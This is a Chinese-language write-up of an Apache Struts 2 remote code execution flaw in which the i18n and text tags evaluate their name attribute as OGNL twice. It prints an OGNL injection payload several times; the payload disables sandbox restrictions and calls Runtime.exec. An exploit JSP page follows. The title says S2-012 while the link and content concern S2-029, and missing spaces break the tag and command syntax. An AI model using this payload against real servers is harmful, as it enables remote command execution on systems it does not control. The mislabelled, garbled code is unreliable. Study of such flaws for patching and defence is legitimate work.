# S2-012 远程代码执行漏洞

影响版本: Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)

漏洞详情: <http://struts.apache.org/docs/s2-029.html>



## 原理

struts2的i18n,text标签的 name属性处理的时候会经过两次ognl执行，从而导致远程代码执行。

标签使用如下所示：s:i18nname="%{#request.lan}">xxxxx/s:i18n>s:textname="%{#request.lan}">xxxxx/s:text>，例如：

```
<s:i18nname="%{#request.lan}">xxxxx</s:i18n>
<s:textname="%{#request.lan}">xxxxx</s:text>
```

上面两个标签name属性都存在问题 下面对i18n标签做分析

跟踪i18n标签name 属性在代码中的处理:
```
org.apache.struts2.components.I18n

......

public boolean start(Writer writer) {

	boolean result = super.start(writer);

	try{

		String name = findString(this.name,"name", "Resource bundle name is required. Example: foo orfoo_en");//对i18n的name属性进行ognl执行并将结果赋值给name

		ResourceBundle bundle = (ResourceBundle)findValue("getTexts('"+ name + "')");//对上面获取的name属性继续做ognl表达式执行

		......

	}

}
```

其中对**findString****方法进行跟踪，则可以跟踪到**

com.opensymphony.xwork2.ognl.OgnlValueStack的protected Object findValue(Stringexpr, String field, String errorMsg) 方法，该方法是用来执行ognl表达式。

其中**findValue****方法进行跟踪，则可以跟踪到**

com.opensymphony.xwork2.ognl.OgnlValueStack的public Object findValue(Stringexpr, boolean throwExceptionOnFailure) 方法，该方法也是用来执行ognl表达式。

假设设置request的lan 属性为:

```
'),request,#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch/tmp/dbapptest'),new java.lang.String('
```

其中运行的ognl表达式为%{request.lan}, 则第一次ognl表达式执行结果为:

```
'),request,#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch/tmp/dbapptest'),new java.lang.String('
```

执行完成之后name的值为:

```
'),request,#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch/tmp/dbapptest'),new java.lang.String('
```

然后将name值传入下面一行代码执行ognl, 其中ognl表达式为

```
getText(''),request,#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch/tmp/dbapptest'),new java.lang.String('')
```

从而导致命令执行在/tmp目录下生成dbapptest 文件

其中poc中需要设置#_memberAccess['allowPrivateAccess']=true 用来授权访问private方法，

\#_memberAccess['allowStaticMethodAccess']=true 用来授权允许调用静态方法，

\#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']用来将受限的包名设置为空

\#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties']用来将受限的类名设置为空

\#a=@java.lang.Runtime@getRuntime(),#a.exec(‘touch/tmp/dbapptest’),new java.lang.String(”)执行系统命令

## Exp
```
<%@pageimport="java.util.HashSet"%>

<%@ pagecontentType="text/html;charset=UTF-8" language="java" %>

<%@ taglib prefix="s"uri="/struts-tags" %>

<html>

<head><title>Demo jsppage</title></head>

<body>

<%

request.setAttribute("lan", "'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch/tmp/fuckxxx'),new java.lang.String('");

%>

<s:i18nname="%{#request.lan}">xxxxx</s:i18n>

</body>

</html>
```
